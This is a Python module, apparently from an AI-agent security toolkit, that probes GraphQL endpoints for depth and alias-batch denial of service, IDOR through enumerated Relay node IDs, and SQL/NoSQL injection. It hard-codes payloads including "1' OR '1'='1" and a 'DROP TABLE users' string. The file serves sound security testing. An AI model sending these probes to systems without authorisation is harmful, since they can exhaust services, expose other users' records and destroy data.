"""GraphQL Security testing tool for web application security."""

from __future__ import annotations

import json
from typing import Any, Literal

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


GraphQLSecurityAction = Literal["test_depth", "test_batch", "test_alias", "test_idor", "test_injection", "analyze"]

# DoS query templates
DEPTH_QUERY_TEMPLATE = """
query DepthTest {{
  {nested_query}
}}
"""

BATCH_QUERY_TEMPLATE = """
query BatchTest {{
  {aliased_queries}
}}
"""


def _generate_nested_query(field: str, depth: int) -> str:
    """Generate a nested query for depth attack testing."""
    if depth <= 0:
        return field
    return f"{field} {{ {_generate_nested_query(field, depth - 1)} }}"


def _generate_aliased_queries(query: str, count: int) -> str:
    """Generate multiple aliased queries for batch attack testing."""
    queries = []
    for i in range(count):
        queries.append(f"q{i}: {query}")
    return "\n  ".join(queries)


def _test_depth_attack(
    url: str,
    field: str = "user",
    max_depth: int = 20,
    timeout: int = 30,
) -> dict[str, Any]:
    """Test for nested query depth attacks."""
    results: dict[str, Any] = {
        "url": url,
        "field": field,
        "tests": [],
        "vulnerable": False,
        "max_accepted_depth": 0,
    }

    for depth in [5, 10, 15, 20, max_depth]:
        if depth > max_depth:
            break

        nested = _generate_nested_query(field, depth)
        query = f"query {{ {nested} }}"

        try:
            response = requests.post(
                url,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )

            test_result: dict[str, Any] = {
                "depth": depth,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
            }

            resp_data = response.json() if response.text else {}

            if "errors" in resp_data:
                # Check for depth limit error
                errors = resp_data.get("errors", [])
                depth_limited = any("depth" in str(e).lower() for e in errors)
                test_result["depth_limited"] = depth_limited
                if not depth_limited:
                    test_result["error"] = errors[0].get("message", "")[:100]
            elif "data" in resp_data:
                test_result["accepted"] = True
                results["max_accepted_depth"] = depth
                if depth >= 10:
                    results["vulnerable"] = True

            results["tests"].append(test_result)

        except requests.exceptions.Timeout:
            results["tests"].append({"depth": depth, "timeout": True})
            results["vulnerable"] = True
            results["finding"] = f"Query with depth {depth} caused timeout - DoS possible"
            break
        except Exception as e:
            results["tests"].append({"depth": depth, "error": str(e)})

    if results["vulnerable"]:
        results["severity"] = "MEDIUM"
        results["recommendations"] = [
            "Implement query depth limiting (recommended max: 7)",
            "Use query complexity analysis",
            "Set query timeout limits",
        ]

    return results


def _test_batch_attack(
    url: str,
    query: str = "__typename",
    max_batch: int = 100,
    timeout: int = 30,
) -> dict[str, Any]:
    """Test for batch/alias-based resource exhaustion."""
    results: dict[str, Any] = {
        "url": url,
        "tests": [],
        "vulnerable": False,
        "max_accepted_batch": 0,
    }

    for batch_size in [10, 25, 50, 100]:
        if batch_size > max_batch:
            break

        aliased = _generate_aliased_queries(query, batch_size)
        full_query = f"query {{ {aliased} }}"

        try:
            response = requests.post(
                url,
                json={"query": full_query},
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )

            test_result: dict[str, Any] = {
                "batch_size": batch_size,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
            }

            resp_data = response.json() if response.text else {}

            if "errors" in resp_data:
                errors = resp_data.get("errors", [])
                batch_limited = any("alias" in str(e).lower() or "limit" in str(e).lower() for e in errors)
                test_result["batch_limited"] = batch_limited
            elif "data" in resp_data:
                test_result["accepted"] = True
                results["max_accepted_batch"] = batch_size
                if batch_size >= 50:
                    results["vulnerable"] = True

            # Check response time for resource exhaustion
            if response.elapsed.total_seconds() > 5:
                test_result["slow_response"] = True
                results["vulnerable"] = True

            results["tests"].append(test_result)

        except requests.exceptions.Timeout:
            results["tests"].append({"batch_size": batch_size, "timeout": True})
            results["vulnerable"] = True
            results["finding"] = f"Batch query with {batch_size} aliases caused timeout"
            break
        except Exception as e:
            results["tests"].append({"batch_size": batch_size, "error": str(e)})

    if results["vulnerable"]:
        results["severity"] = "MEDIUM"
        results["recommendations"] = [
            "Implement alias limiting",
            "Use query complexity scoring",
            "Limit total query operations",
        ]

    return results


def _test_idor(
    url: str,
    node_id: str,
    alternative_ids: list[str] | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for IDOR via GraphQL node/relay queries."""
    results: dict[str, Any] = {
        "url": url,
        "original_id": node_id,
        "vulnerable": False,
        "tests": [],
    }

    # Standard Relay node query
    node_query = """
    query NodeIDOR($id: ID!) {
      node(id: $id) {
        id
        __typename
        ... on User { email name }
        ... on Order { total status }
        ... on Document { content title }
      }
    }
    """

    # Test original ID
    try:
        response = requests.post(
            url,
            json={"query": node_query, "variables": {"id": node_id}},
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )

        original_result = response.json() if response.text else {}
        results["original_response"] = {
            "status": response.status_code,
            "has_data": "data" in original_result and original_result["data"].get("node") is not None,
        }
    except Exception as e:
        results["original_response"] = {"error": str(e)}

    # Test alternative IDs
    test_ids = alternative_ids or [
        "VXNlcjox",  # Base64: User:1
        "VXNlcjoy",  # Base64: User:2
        node_id.replace("1", "2") if "1" in node_id else node_id + "1",
    ]

    for test_id in test_ids:
        try:
            response = requests.post(
                url,
                json={"query": node_query, "variables": {"id": test_id}},
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )

            resp_data = response.json() if response.text else {}
            test_result: dict[str, Any] = {
                "test_id": test_id,
                "status_code": response.status_code,
            }

            if "data" in resp_data and resp_data["data"].get("node"):
                test_result["data_returned"] = True
                test_result["typename"] = resp_data["data"]["node"].get("__typename")

                # Check if we got different data than original
                if test_id != node_id:
                    results["vulnerable"] = True
                    test_result["unauthorized_access"] = True

            results["tests"].append(test_result)

        except Exception as e:
            results["tests"].append({"test_id": test_id, "error": str(e)})

    if results["vulnerable"]:
        results["severity"] = "HIGH"
        results["recommendations"] = [
            "Implement authorization checks in GraphQL resolvers",
            "Validate user has access to requested node",
            "Use viewer pattern for user-specific queries",
        ]

    return results


def _test_injection(
    url: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Test for GraphQL injection vulnerabilities."""
    results: dict[str, Any] = {
        "url": url,
        "tests": [],
        "vulnerable": False,
    }

    injection_payloads = [
        # SQL injection via arguments
        ('query { user(id: "1\' OR \'1\'=\'1") { id } }', "sqli"),
        ('query { user(id: "1; DROP TABLE users--") { id } }', "sqli"),
        # NoSQL injection
        ('query { user(filter: {$gt: ""}) { id } }', "nosqli"),
        # Field injection
        ('query { __typename @include(if: true) }', "directive"),
        # Introspection (should be disabled in prod)
        ('query { __schema { types { name } } }', "introspection"),
    ]

    for payload, payload_type in injection_payloads:
        try:
            response = requests.post(
                url,
                json={"query": payload},
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )

            test_result: dict[str, Any] = {
                "payload_type": payload_type,
                "status_code": response.status_code,
            }

            resp_data = response.json() if response.text else {}

            # Check for error messages that leak info
            if "errors" in resp_data:
                errors = resp_data.get("errors", [])
                for error in errors:
                    msg = str(error.get("message", "")).lower()
                    if any(db in msg for db in ["sql", "mysql", "postgres", "mongodb"]):
                        results["vulnerable"] = True
                        test_result["database_error_leak"] = True

            # Introspection check
            if payload_type == "introspection" and "data" in resp_data:
                if resp_data["data"].get("__schema"):
                    test_result["introspection_enabled"] = True
                    results["introspection_warning"] = "Introspection is enabled - disable in production"

            results["tests"].append(test_result)

        except Exception as e:
            results["tests"].append({"payload_type": payload_type, "error": str(e)})

    return results


def _analyze_endpoint(
    url: str,
    timeout: int = 10,
) -> dict[str, Any]:
    """Analyze GraphQL endpoint for security configuration."""
    results: dict[str, Any] = {
        "url": url,
        "security_checks": {},
    }

    # Check introspection
    introspection_query = '{"query": "{ __schema { types { name } } }"}'
    try:
        response = requests.post(
            url,
            data=introspection_query,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        resp_data = response.json() if response.text else {}
        results["security_checks"]["introspection"] = {
            "enabled": "data" in resp_data and resp_data["data"].get("__schema") is not None,
            "recommendation": "Disable in production" if resp_data.get("data", {}).get("__schema") else "Properly disabled",
        }
    except Exception:
        results["security_checks"]["introspection"] = {"error": "Could not test"}

    # Check for field suggestions
    suggestion_query = '{"query": "{ user { namee } }"}'  # Intentional typo
    try:
        response = requests.post(
            url,
            data=suggestion_query,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        resp_data = response.json() if response.text else {}
        errors = resp_data.get("errors", [])
        suggestions_enabled = any("did you mean" in str(e).lower() for e in errors)
        results["security_checks"]["field_suggestions"] = {
            "enabled": suggestions_enabled,
            "recommendation": "Disable in production" if suggestions_enabled else "Properly disabled",
        }
    except Exception:
        results["security_checks"]["field_suggestions"] = {"error": "Could not test"}

    # Check batch query support
    batch_query = '[{"query": "{ __typename }"}, {"query": "{ __typename }"}]'
    try:
        response = requests.post(
            url,
            data=batch_query,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        results["security_checks"]["batch_queries"] = {
            "enabled": response.status_code == 200 and isinstance(response.json(), list),
            "recommendation": "Limit batch query size",
        }
    except Exception:
        results["security_checks"]["batch_queries"] = {"error": "Could not test"}

    return results


@register_tool
def graphql_security_tester(
    action: GraphQLSecurityAction,
    url: str,
    field: str = "user",
    query: str = "__typename",
    node_id: str | None = None,
    alternative_ids: str | None = None,
    max_depth: int = 20,
    max_batch: int = 100,
    timeout: int = 30,
    **kwargs: Any,
) -> dict[str, Any]:
    """Test GraphQL endpoints for security vulnerabilities.

    Tests for DoS via nested queries, batch attacks, IDOR via node queries,
    and various injection vulnerabilities.

    Args:
        action: The testing action:
            - test_depth: Test nested query depth attacks (DoS)
            - test_batch: Test batch/alias-based resource exhaustion
            - test_alias: Alias for test_batch
            - test_idor: Test IDOR via GraphQL node/relay queries
            - test_injection: Test for GraphQL injection vulnerabilities
            - analyze: Analyze endpoint security configuration
        url: GraphQL endpoint URL
        field: Field name for depth testing
        query: Query for batch testing
        node_id: Node ID for IDOR testing
        alternative_ids: Comma-separated alternative IDs for IDOR
        max_depth: Maximum depth for testing
        max_batch: Maximum batch size for testing
        timeout: Request timeout

    Returns:
        GraphQL security test results with vulnerability indicators
    """
    VALID_PARAMS = {"action", "url", "field", "query", "node_id", "alternative_ids", "max_depth", "max_batch", "timeout"}
    VALID_ACTIONS = ["test_depth", "test_batch", "test_alias", "test_idor", "test_injection", "analyze"]

    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "graphql_security_tester")
    if unknown_error:
        unknown_error.update(generate_usage_hint("graphql_security_tester", "analyze", {"url": "https://example.com/graphql"}))
        return unknown_error

    action_error = validate_action_param(action, VALID_ACTIONS, "graphql_security_tester")
    if action_error:
        return action_error

    url_error = validate_required_param(url, "url", action, "graphql_security_tester")
    if url_error:
        return url_error

    # Parse alternative_ids
    alt_ids = None
    if alternative_ids:
        alt_ids = [id.strip() for id in alternative_ids.split(",") if id.strip()]

    try:
        if action == "test_depth":
            return _test_depth_attack(url, field, max_depth, timeout)

        if action in ["test_batch", "test_alias"]:
            return _test_batch_attack(url, query, max_batch, timeout)

        if action == "test_idor":
            if not node_id:
                return {"error": "node_id is required for test_idor action"}
            return _test_idor(url, node_id, alt_ids, timeout)

        if action == "test_injection":
            return _test_injection(url, timeout)

        if action == "analyze":
            return _analyze_endpoint(url, timeout)

        return {"error": f"Unknown action: {action}"}

    except Exception as e:
        return {"error": f"GraphQL security testing failed: {e!s}"}
